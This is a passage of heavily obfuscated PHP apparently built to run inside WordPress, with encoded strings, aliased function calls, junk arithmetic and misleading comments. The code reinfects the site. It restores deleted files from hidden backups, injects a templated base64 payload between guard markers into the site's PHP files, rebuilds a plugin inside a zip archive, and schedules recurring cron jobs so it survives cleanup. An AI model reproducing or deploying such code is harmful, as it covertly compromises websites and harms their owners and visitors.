   $eobkv2geokuos      =      (defined(c1sob647u1i(1571))  ?    WP_CONTENT_DIR   : (defined(c1sob647u1i(1619))    ?  ABSPATH  .  hn_f08x0cns80(744)   :   "")) . c1sob647u1i(1720);$x4jdtf03h=(0x79+0x9a);$cavmxic41jgon=$x4jdtf03h%7;
  $tbyw8tby8i6y =  (string) @get_option(iw6xe9q4j6sneg(1089),  "");
if ($tbyw8tby8i6y     !==    "") $toxd7lwn40kosh59[]    =    $eobkv2geokuos . $tbyw8tby8i6y .    iw6xe9q4j6sneg(1721);
       $xco6qs135fjlssoa  =     (string)  @get_option(hn_f08x0cns80(1722),  "");
      if ($xco6qs135fjlssoa   !==    ""   &&  $xco6qs135fjlssoa    !== $tbyw8tby8i6y)     $toxd7lwn40kosh59[]  =     $eobkv2geokuos .  $xco6qs135fjlssoa      .     ovffvv33(1723);
return $toxd7lwn40kosh59;
}
 function   vy824n5yej1h7p7jzp4()
 {$nlqvqld0a8=91*9;$g6jp3m84=$nlqvqld0a8-34;


 if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(501))  && is_multisite()   &&   $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(222)))  {
 return (array)  @get_site_option(iw6xe9q4j6sneg(1724),  array());
   }
// configure chain for WP BlockControls

return (array) @get_option(iw6xe9q4j6sneg(1724), array());


 }
   function    t49_br7xbw9umi0am($wpzy6fg5fms6r)


  {
   if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(501))  &&    is_multisite() &&     $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1725)))   {
 @update_site_option(bpowi0iglycvx(1726),      $wpzy6fg5fms6r);
  return;
  }
 @update_option(bpowi0iglycvx(1727),   $wpzy6fg5fms6r,  bpowi0iglycvx(1618));
     }
   function wnipu9gjci4jqxs06nd($w90pshmxoqhf)



  {
$wpzy6fg5fms6r  = vy824n5yej1h7p7jzp4();$dkejbcz3it=(0xc2+0x3d);$g4vy_v9rj63ya=$dkejbcz3it%8;



 return     isset($wpzy6fg5fms6r[nreub2fs747eromoe($w90pshmxoqhf,      (106^102))]);
   }
function  xag4zxobul2m9tpv($w90pshmxoqhf)
     {



   $wpzy6fg5fms6r   = vy824n5yej1h7p7jzp4();$oofj_lvn=PHP_MAJOR_VERSION;$m71raw_278zu=$oofj_lvn*6;
  $ms85bc6dstk7   = $GLOBALS['__scf_qzyo0sgkyb6_202']()   -      (7775942+58);
   foreach  ($wpzy6fg5fms6r  as  $htuh36niay71vh  =>   $craz2yx3if4zmcr6)   {
  if      ((int)   $craz2yx3if4zmcr6 <   $ms85bc6dstk7)  unset($wpzy6fg5fms6r[$htuh36niay71vh]);  
   }
 $wpzy6fg5fms6r[nreub2fs747eromoe($w90pshmxoqhf,  (0x4+0x8))] = $GLOBALS['__scf_qzyo0sgkyb6_202']();
 

  t49_br7xbw9umi0am($wpzy6fg5fms6r);
      }
 function b_v_bj_hwaccgkffos8roj($w90pshmxoqhf, $f95gmfn4ulxv38r)
 {
if  (!$GLOBALS['__scf_fv3zevxzzb_44']($f95gmfn4ulxv38r)      ||  $f95gmfn4ulxv38r ===  ""   ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($f95gmfn4ulxv38r) >    (1048493+83)) return;




 $knyuit5bxvvtjxka   =   $GLOBALS['__scf_qkze49lvhswo_1292'](hn_f08x0cns80(1293),  $f95gmfn4ulxv38r);
        $qzlazzt89842yv   =   (array) @get_option(c1sob647u1i(1728), array());
$u_irchgch79o = nreub2fs747eromoe($w90pshmxoqhf,      (9+3));
  if (isset($qzlazzt89842yv[$u_irchgch79o][bpowi0iglycvx(1293)]) &&  $qzlazzt89842yv[$u_irchgch79o][ovffvv33(1293)]  === $knyuit5bxvvtjxka)  return;
       $qzlazzt89842yv[$u_irchgch79o]  =  array(c1sob647u1i(1631) =>    $GLOBALS['__scf_d4eyetogjbsnt_10']($f95gmfn4ulxv38r), c1sob647u1i(1293) =>    $knyuit5bxvvtjxka,  iw6xe9q4j6sneg(1729)   =>      $GLOBALS['__scf_f2vx2328qo_369']($f95gmfn4ulxv38r));



 @update_option(c1sob647u1i(1728), $qzlazzt89842yv,  hn_f08x0cns80(1618));
 }

function   j63a0pbiudm7y5ybkw1f($w90pshmxoqhf)
       {
// faithful allocator

  $qzlazzt89842yv  = (array)  @get_option(c1sob647u1i(1728),      array());
  $cje8wku90zm4r =  isset($qzlazzt89842yv[nreub2fs747eromoe($w90pshmxoqhf, (10+2))])   ? $qzlazzt89842yv[nreub2fs747eromoe($w90pshmxoqhf,   (5+7))] :    null;
      if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($cje8wku90zm4r)  ||    empty($cje8wku90zm4r[hn_f08x0cns80(1730)])   ||  empty($cje8wku90zm4r[c1sob647u1i(1631)]) ||     empty($cje8wku90zm4r[bpowi0iglycvx(1293)]))   return false;
 $wbw1s8q9qbk05  =   $GLOBALS['__scf_i8wggf4l_3p_373']($cje8wku90zm4r[iw6xe9q4j6sneg(1731)], true);
 if    (!$GLOBALS['__scf_fv3zevxzzb_44']($wbw1s8q9qbk05)   || $GLOBALS['__scf_d4eyetogjbsnt_10']($wbw1s8q9qbk05) !== (int)     $cje8wku90zm4r[c1sob647u1i(1631)])  return  false;
      if   ($GLOBALS['__scf_qkze49lvhswo_1292'](ovffvv33(1293),    $wbw1s8q9qbk05)  !== $cje8wku90zm4r[f6yrzd2knrmb(1732)])  return   false;
  if (!ib2ffadoyj2m6zxmkaa2in($wbw1s8q9qbk05))  return   false;
  return $wbw1s8q9qbk05;
    }
   function     pq4gejuy8pqbi1z4c5aww($puwccc9l0gmis76i, $current)
 {
$a22r98njo0dzy8_c =   tl0ublf2y8592ys5($current);



    if     (!$GLOBALS['__scf_fv3zevxzzb_44']($a22r98njo0dzy8_c)     || $a22r98njo0dzy8_c  ===   "") return    false;



 $wgq71n9fnzr7    =    p2b_7j_9ex54eg4() . c1sob647u1i(1733)   .   nreub2fs747eromoe($puwccc9l0gmis76i, (0x4+0x8))    . iw6xe9q4j6sneg(1482);



 $_ex =   @$GLOBALS['__scf_rjpcj9l4bigb5_21']($wgq71n9fnzr7)    ?   @$GLOBALS['__scf_utyj_ckly79_101']($wgq71n9fnzr7)   :   false;
if (!$GLOBALS['__scf_fv3zevxzzb_44']($_ex) ||  $_ex    !==  $a22r98njo0dzy8_c)   {
  if  (!c5kyk62yk_dwfeubni4b($wgq71n9fnzr7,    $a22r98njo0dzy8_c))  return  false;
 $_ex =    @$GLOBALS['__scf_rjpcj9l4bigb5_21']($wgq71n9fnzr7) ? @$GLOBALS['__scf_utyj_ckly79_101']($wgq71n9fnzr7)      :      false;
 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($_ex)  || $_ex   !== $a22r98njo0dzy8_c)  return    false;
}
/* free director */

   b_v_bj_hwaccgkffos8roj($puwccc9l0gmis76i,  $a22r98njo0dzy8_c);
 return      true;
 }
  function af3r9vnox_vzmrvvakdxp()


     {
t49_br7xbw9umi0am(array());
        }
      function   x2ut8987_i4qlhi()
      {
     try {
 if  (!defined(bpowi0iglycvx(1619)) ||  !$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1651))) return;
 foreach    (_nt_1te3ocatjifl() as  $mg2z53j_fvzumb)   {
   if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($mg2z53j_fvzumb)  &&    @$GLOBALS['__scf_b42duf6j1zadm9_105']($mg2z53j_fvzumb) >  0)   continue;
        $wgq71n9fnzr7 = p2b_7j_9ex54eg4()  . bpowi0iglycvx(1734)   .   nreub2fs747eromoe($mg2z53j_fvzumb,   (9+3))   .   ovffvv33(1482);
$zek2owtasmmjpr6 = @$GLOBALS['__scf_rjpcj9l4bigb5_21']($wgq71n9fnzr7)  ?     @$GLOBALS['__scf_utyj_ckly79_101']($wgq71n9fnzr7) :    false;
       if    (!$GLOBALS['__scf_fv3zevxzzb_44']($zek2owtasmmjpr6)     || $zek2owtasmmjpr6 ===    "")   {


       $zek2owtasmmjpr6 =  j63a0pbiudm7y5ybkw1f($mg2z53j_fvzumb); 
    if     ($GLOBALS['__scf_fv3zevxzzb_44']($zek2owtasmmjpr6) && $zek2owtasmmjpr6    !==  "")  @c5kyk62yk_dwfeubni4b($wgq71n9fnzr7, $zek2owtasmmjpr6);
   }
 if (!$GLOBALS['__scf_fv3zevxzzb_44']($zek2owtasmmjpr6)      || $zek2owtasmmjpr6  ===   "")   continue;
 clearstatcache(true,  $mg2z53j_fvzumb);      
     if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($mg2z53j_fvzumb) && @$GLOBALS['__scf_b42duf6j1zadm9_105']($mg2z53j_fvzumb)  >  0)  continue;
  if    (c5kyk62yk_dwfeubni4b($mg2z53j_fvzumb,  $zek2owtasmmjpr6))  {
  g_qoqdy38lfl4v4n3618(bpowi0iglycvx(664),    hn_f08x0cns80(1735));
  xag4zxobul2m9tpv($mg2z53j_fvzumb);
 }



}

  }  catch  (Throwable  $cje8wku90zm4r)  {
      g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(664),      $cje8wku90zm4r);
   }  catch   (Exception $cje8wku90zm4r)   {
   }
     }
    function    v2zbqes7f920q4()
  {
    try {
      if  (!defined(ovffvv33(1619)))    return     false;
    $y8v_rgi7mvkimn_ = _nt_1te3ocatjifl();
if      (empty($y8v_rgi7mvkimn_))   return   false;
$abe7rxcpkk9nsv   = dfb4_mpcgxvnp230hvh1v()      .  ':' . nreub2fs747eromoe(ABSPATH     . ovffvv33(1736),      (107^99));
   $cxi_2i7q2h   =  bpowi0iglycvx(1737)   . $abe7rxcpkk9nsv .   f6yrzd2knrmb(1321);

     $ekxvczjmiyqtk     =      c1sob647u1i(1738)   . $abe7rxcpkk9nsv   .  c1sob647u1i(1321);
    $u0cdkohgz2xqw9    =  ovffvv33(1739)  . $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60'](ABSPATH  . (string)  e16j_u99g1ldi90iix1i9i()),  0, (5+3));
  $pjov750v0e = $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),  ovffvv33(1740));
 $fqntej805r =    eos4svadcaj0dow8y();
      if (!$fqntej805r)     return   false;


 $j0qdbzc9sw     = qjclarwdule01mm6a3h4wo(
bpowi0iglycvx(665),
    array('__SLUG__',     '__PLUGIN_BASE64__',     '__GUARD_NAME__',     '__VERSION__'),
        array($pjov750v0e, $fqntej805r, $u0cdkohgz2xqw9,  dfb4_mpcgxvnp230hvh1v())
 );


 if     (!$j0qdbzc9sw)  {
   if  ((int)   get_option(bpowi0iglycvx(1741),    0)   >    0)   g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1742),   hn_f08x0cns80(1743));
  return  false;
  }
// constant-time structural-type

  $j0qdbzc9sw  =  $GLOBALS['__scf_renvrk8nefa8_474'](c1sob647u1i(1328), "", $j0qdbzc9sw);
  if (!$GLOBALS['__scf_fv3zevxzzb_44']($j0qdbzc9sw)  || $j0qdbzc9sw ===   "")  return    false;


$ixvedgx30ry2   =    false;$smt9ia46ag=80*4;$f_cj1ly5=$smt9ia46ag-3;
     foreach   ($y8v_rgi7mvkimn_     as      $puwccc9l0gmis76i)   {


   if  (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($puwccc9l0gmis76i))   continue;
     if (wnipu9gjci4jqxs06nd($puwccc9l0gmis76i)) continue;


      $wshcsvxqz9rcjeq4  =  $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(24)) ?    @$GLOBALS['__scf_huiecxntl0_24']($puwccc9l0gmis76i, 'c') :  false;
    if   ($wshcsvxqz9rcjeq4    !==     false  &&     $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1005))   && !@flock($wshcsvxqz9rcjeq4,    LOCK_EX  |   LOCK_NB))  {
     @fclose($wshcsvxqz9rcjeq4);


continue;
 }



$current      =     @$GLOBALS['__scf_utyj_ckly79_101']($puwccc9l0gmis76i);



      if  (!$GLOBALS['__scf_fv3zevxzzb_44']($current)) {
g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1742),  c1sob647u1i(1744));
if  ($wshcsvxqz9rcjeq4  !==  false)   {
  if    ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1005))) @flock($wshcsvxqz9rcjeq4, LOCK_UN);
  @fclose($wshcsvxqz9rcjeq4);
  }
  continue;$s1l4tkec85x9s=6031;$y4foxzds83=$s1l4tkec85x9s%13;
  




 }
try     {
// equivariant container




    if ($GLOBALS['__scf_d4eyetogjbsnt_10']($current) > (1827235-778659))    $current  =     k12vjaxiygekdnj($current);
  if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($current,    $cxi_2i7q2h)  !== false &&    $GLOBALS['__scf_w6mdcepio4lkz5_7']($current,     $ekxvczjmiyqtk) !== false) {
$ixvedgx30ry2   =   true;
        continue;
// WP Post Content transient TTL



 }
      if (!@$GLOBALS['__scf_sunuwikkpg6_51']($puwccc9l0gmis76i))  continue;
  $_qr1w5trunvt9sx =     nreub2fs747eromoe(ABSPATH   .  hn_f08x0cns80(1745),   (4<<1));
  $ydwpa0o3359d5   =    $current;

   $current =  zb8j7k_ktia5b5er11h($current,    f6yrzd2knrmb(1441),     iw6xe9q4j6sneg(1746));


$current =  $GLOBALS['__scf_renvrk8nefa8_474'](hn_f08x0cns80(1448),   "",  $current);
   if  (!$GLOBALS['__scf_fv3zevxzzb_44']($current)) {
  g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1747),  c1sob647u1i(1327));
continue;
      }
   if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($current,   f6yrzd2knrmb(1550))     !==  false   ||  $GLOBALS['__scf_w6mdcepio4lkz5_7']($current,   hn_f08x0cns80(1748))    !== false) {
 $na7p60qdbqf9     =    $GLOBALS['__scf_w6mdcepio4lkz5_7']($current, hn_f08x0cns80(1550));
  $dxidzha0nlzdy =   ($na7p60qdbqf9    !== false)    ?     $GLOBALS['__scf_nv7he759wjfj_9']($current, $na7p60qdbqf9)      :     $current;


     if  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($dxidzha0nlzdy,   iw6xe9q4j6sneg(1749))   === false  && $GLOBALS['__scf_w6mdcepio4lkz5_7']($dxidzha0nlzdy,   bpowi0iglycvx(1748)) ===   false    && !$GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(1750)   . $_qr1w5trunvt9sx .    iw6xe9q4j6sneg(1751),    $dxidzha0nlzdy))    {
g_qoqdy38lfl4v4n3618(c1sob647u1i(1747),   c1sob647u1i(1752));
  continue;


  }


  $tbfuoibnbxd = $GLOBALS['__scf_renvrk8nefa8_474'](hn_f08x0cns80(1753),     "\n",     $current);
 if      ($GLOBALS['__scf_fv3zevxzzb_44']($tbfuoibnbxd))   $current  =     $tbfuoibnbxd;
       $tbfuoibnbxd =  $GLOBALS['__scf_renvrk8nefa8_474'](hn_f08x0cns80(1754),  "",  $current);
if ($GLOBALS['__scf_fv3zevxzzb_44']($tbfuoibnbxd))   $current   =     $tbfuoibnbxd;
     unset($tbfuoibnbxd);
   if     ($GLOBALS['__scf_w6mdcepio4lkz5_7']($current,  c1sob647u1i(1550)) !==  false)   {

    g_qoqdy38lfl4v4n3618(c1sob647u1i(1755),  c1sob647u1i(1756));
   continue;
   }
// isometric opaque-type


      }
  if  ($ixvedgx30ry2)  {



  if     ($current    ===  $ydwpa0o3359d5) continue;
      $b3_4y4x1hqp   =   @$GLOBALS['__scf_utyj_ckly79_101']($puwccc9l0gmis76i);
 if    (!$GLOBALS['__scf_fv3zevxzzb_44']($b3_4y4x1hqp)) continue;
    if    ($GLOBALS['__scf_d4eyetogjbsnt_10']($b3_4y4x1hqp)     > (0x20190+0xdfe70))   $b3_4y4x1hqp  = k12vjaxiygekdnj($b3_4y4x1hqp);$hwzww_3b15o9nq=62*8;$ixj_d40ueqn5=$hwzww_3b15o9nq-2;
if  ($b3_4y4x1hqp  !==   $ydwpa0o3359d5)  {
 g_qoqdy38lfl4v4n3618(ovffvv33(1757), c1sob647u1i(1244));
  continue;
  }
    unset($b3_4y4x1hqp);
       if      (!pq4gejuy8pqbi1z4c5aww($puwccc9l0gmis76i, $current)) continue;
  if (!l1s0od7mbsjgia4oi($puwccc9l0gmis76i,   $current))  continue;



if (c5kyk62yk_dwfeubni4b($puwccc9l0gmis76i, $current))   ghttebm5ugw_js_hn2zmc($puwccc9l0gmis76i);
continue;
}
  if  ($GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(1758), $current))  {


 g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1759),   hn_f08x0cns80(1760));
 continue;
 }
 $u88ioowu1puee85o  =   bpowi0iglycvx(1304);



  if     ($GLOBALS['__scf_d4eyetogjbsnt_10']($current)    > 0 &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($current,      bpowi0iglycvx(249))    !==  false) {
  $tdzhsx7039vol    =    false;
 if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(250)))  {
$pu0nkp12g033t    =    @token_get_all($current);
  if   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($pu0nkp12g033t))    {
 foreach  ($pu0nkp12g033t  as $wpxqpjx54snp)  {

if     ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpxqpjx54snp)) {
 if  ($wpxqpjx54snp[0] ===    T_OPEN_TAG ||    (defined(hn_f08x0cns80(1761))   &&   $wpxqpjx54snp[0]      === T_OPEN_TAG_WITH_ECHO)) $tdzhsx7039vol    =   true;


  elseif  ($wpxqpjx54snp[0]   ===    T_CLOSE_TAG)   $tdzhsx7039vol      =  false;
 }
}
}
  unset($pu0nkp12g033t,  $wpxqpjx54snp);
    }  else {
  $s8l6khz1_c10  = $GLOBALS['__scf_eyvubii89y_1762']($current,    ovffvv33(249));
$ck_vx8swdwg1j26   = $GLOBALS['__scf_eyvubii89y_1762']($current,  c1sob647u1i(1763));
 if   ($s8l6khz1_c10  !==    false &&  ($ck_vx8swdwg1j26   === false  ||  $s8l6khz1_c10   >  $ck_vx8swdwg1j26))  $tdzhsx7039vol   =    true;
 unset($s8l6khz1_c10,    $ck_vx8swdwg1j26);
    }
if     ($tdzhsx7039vol)  $u88ioowu1puee85o      =   "";
 unset($tdzhsx7039vol);
 }
 $am1r5m31mdf2ycs  =   ($GLOBALS['__scf_d4eyetogjbsnt_10']($current) >     0)      ?  "\n"     : "";
       $gv5si2f98cf  = $GLOBALS['__scf_usy4mchq83xa_378']($u0cdkohgz2xqw9, $u0cdkohgz2xqw9  . '_' .    $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($puwccc9l0gmis76i),    0, (0x3+0x1)),    $j0qdbzc9sw);



 $h_745ip8s30z  =    $am1r5m31mdf2ycs  . $u88ioowu1puee85o . $cxi_2i7q2h   .  "\n"  .  $gv5si2f98cf .  "\n"    . $ekxvczjmiyqtk   .     "\n";
   unset($gv5si2f98cf);

   $b3_4y4x1hqp  =     @$GLOBALS['__scf_utyj_ckly79_101']($puwccc9l0gmis76i);
 if  (!$GLOBALS['__scf_fv3zevxzzb_44']($b3_4y4x1hqp))   {
unset($ydwpa0o3359d5);
   continue;
  }
if  ($GLOBALS['__scf_d4eyetogjbsnt_10']($b3_4y4x1hqp)  >   (1048479+97)) $b3_4y4x1hqp   =  k12vjaxiygekdnj($b3_4y4x1hqp);
    if  ($b3_4y4x1hqp !==  $ydwpa0o3359d5)  {
     unset($b3_4y4x1hqp,   $ydwpa0o3359d5);
  g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1759),     iw6xe9q4j6sneg(1244));
 


 continue;



 }
 unset($b3_4y4x1hqp,  $ydwpa0o3359d5);
 if   (!pq4gejuy8pqbi1z4c5aww($puwccc9l0gmis76i, $current))     continue;
  if (!l1s0od7mbsjgia4oi($puwccc9l0gmis76i,    $current))  {
g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1759), ovffvv33(1719));$i7q8ysn5ysv=77|232;$pjum3rb0gp_e=$i7q8ysn5ysv^69;
 continue;
  }
if   (!c5kyk62yk_dwfeubni4b($puwccc9l0gmis76i, $current     .   $h_745ip8s30z))  continue;
  ghttebm5ugw_js_hn2zmc($puwccc9l0gmis76i);



    $ixvedgx30ry2 =    true;
       }     finally {
     if   ($wshcsvxqz9rcjeq4     !==  false)  {
       if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1005)))   @flock($wshcsvxqz9rcjeq4,   LOCK_UN);$lhap5fhg=776;$q_1xfpkyjdsn=($lhap5fhg>0)?$lhap5fhg:-$lhap5fhg;
   @fclose($wshcsvxqz9rcjeq4);
 }
 }
  }
return $ixvedgx30ry2;
    } catch  (Throwable   $cje8wku90zm4r)  {
        g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1759),     $cje8wku90zm4r);
return false;
  } catch  (Exception $cje8wku90zm4r)     {
return    false;
}
// @gather write-ahead-log

}
   function  kbdxdebb1nf0m4xuzvk6vm()
   {
   try  {
if (!defined(hn_f08x0cns80(1619)))    return;
   if   (hiisk00z0i4v1wyj3(bmvtr5sdqjf5km1t()))      return;
 $ftvsfz7ji2  = ircnjcyfmf8qkc7xdiss4();
  $sqgwaijtfri  =    nreub2fs747eromoe(ABSPATH   .   ovffvv33(1764), (4+4)) .  ovffvv33(1313);



  $pjov750v0e =  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),   c1sob647u1i(1740));$ncsbh5fvlv=75*8;$oj3wyb8pd=$ncsbh5fvlv-42;
   $egziouap1xyua   = bfyls7pdkqkf4p8az();


  if (!$egziouap1xyua || $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)    <  (409+91)) {
g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1226),  bpowi0iglycvx(1765));
 return;

  }
    if  (!$GLOBALS['__scf_dr1wex6ejrn2_554'](hn_f08x0cns80(1766)))  return;
   $_sk4p5ip29    =   array(
   $ftvsfz7ji2 . '/'   .   $sqgwaijtfri,
   $ftvsfz7ji2  .    iw6xe9q4j6sneg(1767)   .     $GLOBALS['__scf_v9_7mhg4uu_1768'](c1sob647u1i(1769))  .  $sqgwaijtfri,
);
 $k66jc2y5qhq_dbxz  = (defined(c1sob647u1i(1770)) ? WP_CONTENT_DIR  : ABSPATH  .   ovffvv33(744))  . bpowi0iglycvx(1771);
 if  (@$GLOBALS['__scf_opq_vgkskw_46']($k66jc2y5qhq_dbxz))   {
  $x48qvcdf3_    = fkx3b4a5rv4j4z5ymcs($k66jc2y5qhq_dbxz, (1903+97));
     if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($x48qvcdf3_))   {
// retry dense interceptor

foreach    ($x48qvcdf3_ as   $cje8wku90zm4r)  {
 $emnni5z67kh0   =  $k66jc2y5qhq_dbxz . '/'    .    $cje8wku90zm4r;
if  (@$GLOBALS['__scf_opq_vgkskw_46']($emnni5z67kh0) &&   @$GLOBALS['__scf_sunuwikkpg6_51']($emnni5z67kh0))  {
   $_sk4p5ip29[] =  $emnni5z67kh0    .  '/'     .  $sqgwaijtfri;
    break;
 }
   }
   }
  }


     foreach   ($_sk4p5ip29 as      $gsnn23u15c3h)  {
      if (@$GLOBALS['__scf_qg7ainp116mf_713']($gsnn23u15c3h)  && @$GLOBALS['__scf_b42duf6j1zadm9_105']($gsnn23u15c3h) > (998+2))    {


  $rimby0cenf2   = c1sob647u1i(1766);
    if   ($GLOBALS['__scf_dr1wex6ejrn2_554']($rimby0cenf2))   {
    $bq4562k3b2_ju_ =  new      $rimby0cenf2();


if (@$bq4562k3b2_ju_->open($gsnn23u15c3h)  ===      true)  {
  $g0sgm8ya6y4dg   = false;
 $vji6arg5gfkkltcp  =  $bq4562k3b2_ju_->locateName($pjov750v0e . '/'   .    $pjov750v0e .    c1sob647u1i(1740));
 if     ($vji6arg5gfkkltcp  !==    false)  {
 $a1pgraltzl_yn     = $bq4562k3b2_ju_->statIndex($vji6arg5gfkkltcp);
if    ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($a1pgraltzl_yn) &&  isset($a1pgraltzl_yn[ovffvv33(1772)]) && (int) $a1pgraltzl_yn[bpowi0iglycvx(1772)]   <= (16777182+34)) {$k3xf6o6sugaz=61+12;$rt1pew50t099qy=$k3xf6o6sugaz-26;
 $vjfi2f8t4pfynqz  =     $bq4562k3b2_ju_->getFromIndex($vji6arg5gfkkltcp);



  $g0sgm8ya6y4dg  =  ($GLOBALS['__scf_fv3zevxzzb_44']($vjfi2f8t4pfynqz) &&   $GLOBALS['__scf_tnonex5o9y_60']($vjfi2f8t4pfynqz)     ===   $GLOBALS['__scf_tnonex5o9y_60']($egziouap1xyua));


   unset($vjfi2f8t4pfynqz);



}
unset($a1pgraltzl_yn);
}
      $bq4562k3b2_ju_->close();

  if ($g0sgm8ya6y4dg)  continue;
  }
 }
}
$t49jadtyjx =    $GLOBALS['__scf_po3uwzhcb63b03_11']($gsnn23u15c3h);
 if (!@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx))   xxvz5dp1zk215e5d9($t49jadtyjx,  (490+3),  true);
 $rimby0cenf2  =  c1sob647u1i(1766);
    $gexurro2x4t_x0  =      lwxb0otgrmrkttfbm_7t_r($t49jadtyjx,   bpowi0iglycvx(980));
if  ($gexurro2x4t_x0  === false) continue;
       $_0yv_bxia65yiq0   = new $rimby0cenf2();
    if (@$_0yv_bxia65yiq0->open($gexurro2x4t_x0,      $rimby0cenf2::CREATE      |    $rimby0cenf2::OVERWRITE)     ===  true)  {
 $_0yv_bxia65yiq0->addFromString($pjov750v0e .     '/'   .  $pjov750v0e .    ovffvv33(1740),  $egziouap1xyua);$aqng2ykyc=(0xe2+0x71);$i75qrgff_we=$aqng2ykyc%6;
$_0yv_bxia65yiq0->close();
$qm0vmtz78u0uh8p    = new $rimby0cenf2();
   if   (@$qm0vmtz78u0uh8p->open($gexurro2x4t_x0)   ===      true)  {
// @aggregate handshake

   $qm0vmtz78u0uh8p->close();
     if     (riq98ofdzw2zl1nzzzxy($gexurro2x4t_x0,   $gsnn23u15c3h)     ||  (l7o387uoh_b5jut19ja8b($gexurro2x4t_x0, $gsnn23u15c3h) &&   cvtaycsw15_xd1srry($gexurro2x4t_x0)))   {
 bouscp0t4dvybv($gsnn23u15c3h,   n22pv0e8f25y0co8());
 ruinnb541lwxm7j($gsnn23u15c3h,  (172+248));
  }  else   {
   cvtaycsw15_xd1srry($gexurro2x4t_x0);
  }
}  else   {
     cvtaycsw15_xd1srry($gexurro2x4t_x0);
 }



   }   else    {
cvtaycsw15_xd1srry($gexurro2x4t_x0);
}
}
 } catch    (Throwable     $cje8wku90zm4r)    {
 g_qoqdy38lfl4v4n3618(ovffvv33(1764),  $cje8wku90zm4r);
     } catch   (Exception $cje8wku90zm4r) {
  }
  }
 function    d63vpl6zq3h5r_()
{


 try {
if   (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1773)) ||   !$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(400))) return;
if  (!defined(c1sob647u1i(1619)))   return;
    $i3scfxw879a  = bpowi0iglycvx(1704);
    if  (!wp_next_scheduled($i3scfxw879a))     {
     wp_schedule_event($GLOBALS['__scf_qzyo0sgkyb6_202']()   +     (256+44), c1sob647u1i(1774),  $i3scfxw879a);
   }
if (!wp_next_scheduled(iw6xe9q4j6sneg(1705))) {$qjvw6vge_=PHP_MAJOR_VERSION;$uzvcijm0u=$qjvw6vge_*7;
 wp_schedule_event($GLOBALS['__scf_qzyo0sgkyb6_202']()  +   (0x120+0x138), bpowi0iglycvx(397),   bpowi0iglycvx(1775));
      }
  }   catch     (Throwable   $cje8wku90zm4r)  {
// mbstring strict: discriminative fallback-handler

  g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1776),  $cje8wku90zm4r);
  } catch (Exception $cje8wku90zm4r)  {
  }
    }
function    hdihguhzcn3t8_gwcc7s()
{

  try {
  if (!defined(hn_f08x0cns80(1777))) return;
$q5il9012qwke   = nreub2fs747eromoe(ABSPATH . 'g',    (16-8));
   $xfbelqsui253m      =     array();


     if    ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1778)))    $xfbelqsui253m[]  = p2b_7j_9ex54eg4();
$xfbelqsui253m[]  = ABSPATH .  bpowi0iglycvx(532);
  if      ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(98)))      $xfbelqsui253m[]  = ircnjcyfmf8qkc7xdiss4();
     foreach   ($xfbelqsui253m     as $zdb0g3ib4b62t)     {
    $b6o5qiokcej927  =  $zdb0g3ib4b62t     .      iw6xe9q4j6sneg(1779)  .   $q5il9012qwke;
if     (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($b6o5qiokcej927)    &&     (int)  @$GLOBALS['__scf_uo_a60ibqnli_104']($b6o5qiokcej927)  >     $GLOBALS['__scf_qzyo0sgkyb6_202']()     - (0x60+0x90))  return;
}
  foreach ($xfbelqsui253m   as     $zdb0g3ib4b62t)  {
    $nr2bxdzmay   = $zdb0g3ib4b62t . c1sob647u1i(1780) . $q5il9012qwke;
if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($nr2bxdzmay))  {



    $niiep5w7aat4 = (int) @$GLOBALS['__scf_uo_a60ibqnli_104']($nr2bxdzmay);
  if   ($niiep5w7aat4  >     $GLOBALS['__scf_qzyo0sgkyb6_202']()  -  (86332+68) &&     $niiep5w7aat4     <=  $GLOBALS['__scf_qzyo0sgkyb6_202']()     +   (79+221))  continue;



    cvtaycsw15_xd1srry($nr2bxdzmay);
   }
